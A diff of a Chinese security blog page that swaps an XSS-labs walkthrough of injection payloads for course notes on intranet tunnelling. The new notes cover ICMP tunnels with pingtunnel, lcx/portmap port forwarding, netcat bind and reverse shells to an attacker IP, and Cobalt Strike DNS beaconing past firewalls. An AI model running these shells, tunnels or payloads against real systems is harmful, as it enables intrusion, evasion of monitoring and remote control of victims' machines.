@@ -4,16 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="xss-labs闯关笔记, tonine">
-    <meta name="description" content="第一关:
-直接改name=script&amp;gt;alert(1)
-
-第二关：
- htmlspecialchares（）函数
-
-第三关：
-对尖括号进行过滤了，可以通过标签的一些特殊事件来执行js代码，
-写入语句：level3.php？keywo">
+    <meta name="keywords" content="小迪-71隧道技术, tonine">
+    <meta name="description" content="71-域横向网络&amp;amp;传输&amp;amp;应用层隧道技术知识点代理和隧道技术的区别123代理：解决网络通信问题隧道：类似过滤绕过，在实际的网络情况，通常会通过各种边界设备、软硬件防火墙，或入侵检测系统来检查对外连接的情况，如果发现异样，就会对">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -25,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>xss-labs闯关笔记 | tonine</title>
+    <title>小迪-71隧道技术 | tonine</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -317,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">xss-labs闯关笔记</h1>
+                    <h1 class="description center-align post-title">小迪-71隧道技术</h1>
                 </div>
             </div>
         </div>
@@ -438,8 +430,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">web漏洞</span>
+                            <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">内网安全</span>
                             </a>
                         
                     </div>
@@ -475,110 +467,54 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h6 id="第一关"><a href="#第一关" class="headerlink" title="第一关:"></a><strong>第一关:</strong></h6><ul>
-<li>直接改name=script&gt;alert(1)</script></li>
-</ul>
-<h6 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a><strong>第二关：</strong></h6><ul>
-<li> htmlspecialchares（）函数</li>
-</ul>
-<h6 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a><strong>第三关：</strong></h6><ul>
-<li>对尖括号进行过滤了，可以通过<input>标签的一些特殊事件来执行js代码，</li>
-<li>写入语句：level3.php？keyword=’onfocus=javascript:alert(1) &gt;</li>
-<li>成功注入 </li>
-</ul>
-<h6 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a><strong>第四关：</strong></h6><ul>
-<li>onclick=”alert（1）或者 “ onmouseover=”alert(1)</li>
-</ul>
-<h6 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a><strong>第五关：</strong></h6><ul>
-<li>用同样方法时发现，onclick被添加下划线干扰了。</li>
-<li>借助超链接执行js代码</li>
-<li>href 属性规定链接的目标： 先把前面的值閉合掉</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&#x27;javascript:alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+                <h3 id="71-域横向网络-amp-传输-amp-应用层隧道技术"><a href="#71-域横向网络-amp-传输-amp-应用层隧道技术" class="headerlink" title="71-域横向网络&amp;传输&amp;应用层隧道技术"></a>71-域横向网络&amp;传输&amp;应用层隧道技术</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h6 id="代理和隧道技术的区别"><a href="#代理和隧道技术的区别" class="headerlink" title="代理和隧道技术的区别"></a>代理和隧道技术的区别</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代理：解决网络通信问题</span><br><span class="line">隧道：类似过滤绕过，</span><br><span class="line">在实际的网络情况，通常会通过各种边界设备、软硬件防火墙，或入侵检测系统来检查对外连接的情况，如果发现异样，就会对通信进行阻断，那隧道就是一种绕过端口屏蔽的通信方式，防火墙两端的数据包通关防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信，当封装的数据包达到目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</span><br></pre></td></tr></table></figure>
 
+<h6 id="隧道技术为了解决什么"><a href="#隧道技术为了解决什么" class="headerlink" title="隧道技术为了解决什么"></a>隧道技术为了解决什么</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过被防火墙或入侵检测系统拦截的通信</span><br><span class="line">cs、msf无法上线、数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</span><br></pre></td></tr></table></figure>
 
+<h6 id="隧道技术前期的必备条件"><a href="#隧道技术前期的必备条件" class="headerlink" title="隧道技术前期的必备条件"></a>隧道技术前期的必备条件</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">应用场景：已经获得一些控制权，但控制时，有拦截，不能进行信息收集或相关上线操作</span><br><span class="line">获取到权限之后，为了更方便的进行传输，绕过拦截、和一些监控，使操作不会异常。</span><br></pre></td></tr></table></figure>
 
-<h6 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a><strong>第六关：</strong></h6><ul>
-<li>同上，大小写绕过</li>
-</ul>
-<h6 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a><strong>第七关</strong>：</h6><ul>
-<li>只有一次过滤，替换为空</li>
-<li>可以尝试javascr<strong>script</strong>ipt 这种方法绕过</li>
-</ul>
-<h6 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a><strong>第八关</strong>：</h6><ul>
-<li>xxxx编码绕过</li>
-</ul>
-<h6 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a><strong>第九关：</strong></h6><ul>
-<li>检测链接里有没有http//，可以在跨站语句后添加http://，然后用//注释掉将网址注释掉 </li>
-</ul>
-<h6 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a><strong>第十关：</strong></h6><ul>
-<li>hidden，隐藏属性值；type=‘text’ （作用是让它显示出来）onclick=‘alert（1）’</li>
-</ul>
-<h6 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a><strong>第十一关：</strong></h6><ul>
-<li>http_referer</li>
-<li>抓包，添加 referer：111，发送到虚拟请求里，查看页面返回，发现111被带入到，value里了，发现注入点，</li>
-<li>写入语句：referer：”type=”text”  onclick=alert(1)</li>
-<li>放包到浏览器，点击搜索框，注入成功</li>
-</ul>
-<h6 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a><strong>第十二关</strong></h6><ul>
-<li>接收 user_agent</li>
-<li>查看页面源码，发现tref值后面有类似user_agent的值，抓包观察，发现值一样，找到注入点，</li>
-<li>写入语句：”type=”text” onclick=”alert(1)</li>
-<li>放包到浏览器，点击搜索框，注入成功</li>
-<li>如何判断有无xss漏洞：地址或数据包有无页面上显示的数据</li>
-</ul>
-<h6 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a><strong>第十三关</strong></h6><ul>
-<li>查看页面源码，发现t_cook有可疑值，抓包发现，在cookie这一栏看到相应值，找到注入点，</li>
-<li>写入语句：”type=”text” onclick=alert(1)，模拟提交，发现注入成功，发到浏览器，点击搜索框，注入成功</li>
-</ul>
-<h6 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a><strong>第十五关</strong></h6><ul>
-<li>src参数无法产生xss的</li>
-<li>ng-app指令，初始化一个angularJSuing应用程序</li>
-<li>ng-include指令</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用于包含外部的html文件，包含的内容将作为指定元素的子节点，ng-include属性的值可以是一个表达式，返回一个文件名，默认情况下包含的文件需要包含在同一个域名下。</span><br><span class="line"></span><br><span class="line">ng-include，如果单纯指定地址，必须加引号</span><br><span class="line"></span><br><span class="line">ng-include，加载外部html，script标签中的内容不执行</span><br><span class="line"></span><br><span class="line">ng-include，加载外部html中含有style标签样式可以识别</span><br><span class="line"></span><br><span class="line">这里出现的ng-include去包含第一关，命令：/level15.php？src=&#x27;level1.php？name=&lt;img src=x onerror=alert(xss)&gt; &#x27; </span><br><span class="line"></span><br><span class="line">src=&#x27;level1.php？name=&lt;img src=w onerror=alert(2)&gt;&#x27;</span><br><span class="line"></span><br><span class="line">img src后跟图片地址，如果图片存在就不会出发oneror。</span><br></pre></td></tr></table></figure>
-
-<h6 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a><strong>第十六关</strong></h6><ul>
-<li><p>改一下参数值，发现被带入到<center>标签中，用最基本的代码测试，发现关键字script、/、空格，都被编码成空格了，猜想源代码是过滤了这些关键字符，需要用一个不需要闭合的标签，比如 上一关用到的 <img></p>
-</li>
-<li><p>写入语句：&lt;img%0asrc=”a”onerror=alert(1)&gt;</p>
-</li>
-<li><p>因为源代码里把空格也过滤了，但img和src中要有空格，可以利用 <strong>回车的url编码格式</strong>的**%0a**绕过。 成功弹窗</p>
-</li>
-</ul>
-<h6 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a><strong>第十七关</strong></h6><ul>
-<li><p>改下参数值，发现被带入到<embed>标签（<embed>标签就是引入一个swf文件到浏览器端）中，而且&lt;&gt;被编码了，</p>
-</li>
-<li><p>页面有一个类似图片的东西，所以可以考虑通过事件来触发，因为src属性是不需要闭合的，只需要一个空格就可以，所以在onclick=alert（”xss”）前加一个空格就好</p>
-</li>
-</ul>
+<p><strong>常用的隧道技术</strong></p>
+<p>网络层：ipv6隧道、icmp隧道</p>
+<p>传输层：tcp隧道、udp隧道、常规端口转发</p>
+<p>应用层：ssh隧道、http/s隧道、dns隧道</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="案例1-网络传输应用层检测连通性-检测"><a href="#案例1-网络传输应用层检测连通性-检测" class="headerlink" title="案例1-网络传输应用层检测连通性-检测"></a>案例1-网络传输应用层检测连通性-检测</h4><p>使用隧道之前需要探测目标机是否支持这种协议</p>
+<p>tcp协议 </p>
 <ul>
-<li><p>onclick事件</p>
-<p>onclick=alert（”xss”）</p>
-</li>
-<li><p>onmouseover (当鼠标移动到该标签上会触发)</p>
-</li>
+<li> 用瑞士军刀-netcat</li>
+<li>执行nc命令：nc ip 端口</li>
 </ul>
-<h6 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a><strong>第十八关</strong></h6><p>同上</p>
-<h6 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a><strong>第十九关</strong></h6><p>这一关涉及到 flash xss的攻击手段，flash产生的xss问题主要有两种方式：</p>
+<p>http协议</p>
 <ul>
-<li>加载第三方资源</li>
-<li>与javascript通信引发xss</li>
+<li> 用curl工具，curl &lt;ip地址:端口&gt;命令，如果远程主机开启了相应的端口，且内网可连接外网的话，就会输入相应的端口信息</li>
 </ul>
-<p><strong>常见的可触发xss的危险函数主要有</strong></p>
+<p>dns协议</p>
 <ul>
-<li>geturl 、navigatetourl、Externalinterface.call、htmltext、loadMovie等</li>
+<li> 检测dns连通性的常用命令是 nslookup和dig</li>
+<li>nslookup是windows自带的dns探测命令</li>
+<li>dig是linux自带的dns探测命令</li>
 </ul>
-<p><strong>xss跨站之waf绕过及安全修复</strong></p>
-<p><strong>onerror事件</strong>：当视频的媒体数据加载期间发生错误时执行javascfript</p>
-<p>&lt;img src=”pic.gif” οnerrοr=”javascript:this.src=’/noPic.gif’;” alt=”pic” /&gt;</p>
-<blockquote>
-<p>因为csdn做了简单的转义，它会将注入的标签，去掉闭合性，也就是会把我们注入的内容理解为：</p>
-</blockquote>
-<p>&lt;img src=”pic.gif” οnerrοr=”javascript:this.src=’/noPic.gif’;” alt=”pic”&gt;</p>
-<blockquote>
-<p>这样，注入的标签就失去了闭合性，对一些普通的攻击就进行了防御，但是onerroe事件是专门针对js出错的，所以，标签闭合性刚好触发了，所以会被执行，执行之后将img标签的scr属性替换成xss注入语句，将注入的地址，弄成不能访问的地址，这样就反复的触发onerror事件，最终导致浏览器堆栈溢出</p>
-</blockquote>
+<p>icmp协议</p>
+<ul>
+<li>ping命令检测</li>
+<li>ping ip地址/域名</li>
+</ul>
+<h4 id="案例2-网络层icmp隧道ptunnel使用-检测、利用"><a href="#案例2-网络层icmp隧道ptunnel使用-检测、利用" class="headerlink" title="案例2-网络层icmp隧道ptunnel使用-检测、利用"></a>案例2-网络层icmp隧道ptunnel使用-检测、利用</h4><p>环境</p>
+<p>检测性，即用相关命令检测是否能通信（icmp利用ping命令或）</p>
+<ul>
+<li>  kali2002-target2-target3</li>
+<li>  pingtunnel是把tcp/udp/sock5（受到防火墙或工具拦截）流量伪装成icmp流量进行转发</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-p  表示链接icmp隧道另一端的机器ip（即目标服务器）</span><br><span class="line">-lp 表示需要监听的本地tcp端口</span><br><span class="line">-da 指定需要转发的机器的ip（即目标内网某一台机器的内网ip）</span><br><span class="line">-dp 指定需要转发的机器的端口（即目标内某一台机器的内网端口）</span><br><span class="line">-x  设置连接的密码</span><br><span class="line">webserver：./ptunnel -x 密码</span><br><span class="line">攻击机：./ -p 跳板机的ip -lp （将目标机器的端口转发到攻击机的端口）监听的本地tcp端口 -da 目标机ip -dp 目标机端口 -x 密码 #转发的dp的请求数据给本地的端口即</span><br><span class="line">lp</span><br><span class="line">攻击机：连接 rdesktop 127.0.0.1 +lp设置的端口</span><br><span class="line">这样连接上去走的协议就是icmp。</span><br><span class="line">流程：连接跳板机的ip，指定目标机的ip和端口，并将这个端口通过跳板机转发到</span><br><span class="line">攻击机的某端口上，从而实现端口转发</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="案例3-传输层转发隧道portmap使用-检测利用"><a href="#案例3-传输层转发隧道portmap使用-检测利用" class="headerlink" title="案例3-传输层转发隧道portmap使用-检测利用"></a>案例3-传输层转发隧道portmap使用-检测利用</h4><p>端口转发工具：windows：lcx     linux：portmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lcx：lcx.exe -slave 攻击ip 3131  本地ip 3389（把本地的3389 转发到攻击ip 3131上）</span><br><span class="line">跳板机：lcx -listen 3131 3333 （监听3131转发到3333上）</span><br><span class="line">攻击机：rdesktop 跳板机 3333 </span><br><span class="line"></span><br><span class="line">通过内网服务器的某一个端口映射到公网另一台服务器的端口上</span><br><span class="line">传输层端口转发</span><br><span class="line">环境：内网主机1 (无法出网，但是能和内网的主机交互) 192.168.33.33 </span><br><span class="line">      内网主机2 （跳板机，可以出网） 192.168.33.11  192.168.32.129</span><br><span class="line">      攻击机kali 192.168.32.128</span><br><span class="line">      </span><br><span class="line">端口映射：端口映射就是将内网中的主机的一个端口映射到外网主机的一个端口，提供相应的服务。</span><br><span class="line">当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上</span><br></pre></td></tr></table></figure>
+
+<h4 id="案例4-传输层转发隧道netcat使用-检测、利用、功能"><a href="#案例4-传输层转发隧道netcat使用-检测、利用、功能" class="headerlink" title="案例4-传输层转发隧道netcat使用-检测、利用、功能"></a>案例4-传输层转发隧道netcat使用-检测、利用、功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">双向连接反弹shell</span><br><span class="line">正向：攻击者连接受害</span><br><span class="line">   - 受害：nc -lp 1234 -e c：windows\system32\cmd.exe  #windows</span><br><span class="line">   - nc -lp 1234 -e /bin/sh  #linux</span><br><span class="line">   - 攻击：nc 受害者ip 1234 成功反弹cmd窗口</span><br><span class="line">反向：受害者连接攻击者</span><br><span class="line">   - 攻击者：nc -lvp 本地1234端口</span><br><span class="line">   - 受害者：nc 攻击ip 1234 -e c:windows/system32/cmd.exe</span><br><span class="line">           nc 攻击ip 1234 -e bin/sh </span><br><span class="line">          </span><br><span class="line">多向连接反弹shell-配合转发</span><br><span class="line">反向：</span><br><span class="line">- 内网机器1和kali有一个相通的网段</span><br><span class="line">- 内网机器1和内网机器2有相通的网段</span><br><span class="line">- 内网机器1:lcx.exe -listen  2222 3333 （内网机器1 监听2222转发到3333）</span><br><span class="line">- 内网机器2:nc 192.168.3.31 2222 -e c：\windwos\system32\cmd.exe （内网机器2把自己的cmd会话给内网机器1的2222端口）</span><br><span class="line">- kali:攻击机：nc -v 内网机器1 3333 （kali连接内网机器1的3333端口）</span><br><span class="line">（流程解释：内网机器1将2222端口的信息都转发到3333端口上，内网机器2生成一个cmd窗口给内网机器1的2222端口，然后被转发到3333端口上了，这是</span><br><span class="line">- kali监听内网机器1的3333端口，即获取了cmd会话）</span><br><span class="line"></span><br><span class="line">相关netcat主要功能测试</span><br><span class="line">指纹服务：nc  -nv 192.168.76.143</span><br><span class="line">端口扫描：nc  -v -z 192.168.76.143 1-100</span><br><span class="line">端口监听：nc  -lvp port</span><br><span class="line">文件传输：nc  -lp 1111 &gt;1.txt | nc -vn ip port &lt; 1.txt -q 1</span><br><span class="line">反弹shell： 反向或正向 如上</span><br><span class="line"></span><br><span class="line">注意！nc老版本是不能反弹shell的</span><br><span class="line">ubuntu安装命令：apt-get -y install netcat-traditional</span><br><span class="line">ubuntu默认安装的是netcat-openbsd，不能反弹shell，需要运行命令进行配置</span><br><span class="line">（root下运行）update-alternatives --config nc 选择 /bin/nc.traditional的编号</span><br></pre></td></tr></table></figure>
+
+<h4 id="案例5-应用层dns隧道配合cs上线-检测、利用、说明"><a href="#案例5-应用层dns隧道配合cs上线-检测、利用、说明" class="headerlink" title="案例5-应用层dns隧道配合cs上线-检测、利用、说明"></a>案例5-应用层dns隧道配合cs上线-检测、利用、说明</h4><p>ssh隧道、http/s隧道、dns隧道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">当常见协议监听器被拦截时，可以换其他协议上线， dns协议上线基本通杀</span><br><span class="line">- cs生成监听时，可以选择payload协议，如果对方服务器防火墙或入侵检测拦截过滤某协议，那就不能进行后续操作，</span><br><span class="line">这时我们就需要其他协议进行绑定。</span><br><span class="line">	- 云主机配置端口53启用-udp</span><br><span class="line">  - 买一个域名修改解析记录</span><br><span class="line">  	- a记录-&gt;服务器主机名-&gt;服务器ip</span><br><span class="line">    - NS记录-ns1主机名-上个a记录地址</span><br><span class="line">    - ns记录-ns2主机名-上个a记录地址</span><br><span class="line">  -配置dns监听器内容</span><br><span class="line">  	- ns1.域名.com</span><br><span class="line">    - ns2.域名.com</span><br><span class="line">    - 服务器.域名.com</span><br><span class="line">  - 生成后门，选择设置的监听器</span><br><span class="line">  - 靶机运行，但dns上线，cs显示unknown，但dns是过程性的，</span><br><span class="line">  所以需要等待一下，而且需要输入启用命令</span><br><span class="line">  	- 启用命令:</span><br><span class="line">    	- checkin [*]</span><br><span class="line">      - mode dns-txt</span><br><span class="line">      - shell 加命令即可</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
 
                 
             </div>
@@ -605,7 +541,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/07/24/xss-labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/">http://example.com/2022/07/24/xss-labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/</a>
+                    <a href="http://example.com/2022/07/24/%E5%B0%8F%E8%BF%AA-71%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">http://example.com/2022/07/24/%E5%B0%8F%E8%BF%AA-71%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -643,8 +579,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">web漏洞</span>
+                                <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">内网安全</span>
                                 </a>
                             
                         </div>
@@ -816,9 +752,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/07/24/%E5%B0%8F%E8%BF%AA-71%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">
                     <div class="card-image">
@@ -836,9 +773,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -847,6 +784,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -865,13 +803,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/07/24/%E5%B0%8F%E8%BF%AA-xss%E8%B7%A8%E7%AB%99%E5%8E%9F%E7%90%86%E5%92%8C%E6%94%BB%E5%87%BB/">
+                <a href="/2022/07/24/xss-labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="小迪-xss跨站原理和攻击">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="xss-labs闯关笔记">
                         
-                        <span class="card-title">小迪-xss跨站原理和攻击</span>
+                        <span class="card-title">xss-labs闯关笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -886,12 +824,8 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E8%A7%86%E9%A2%91%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    小迪视频笔记
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
                             
                         </span>
                     </div>
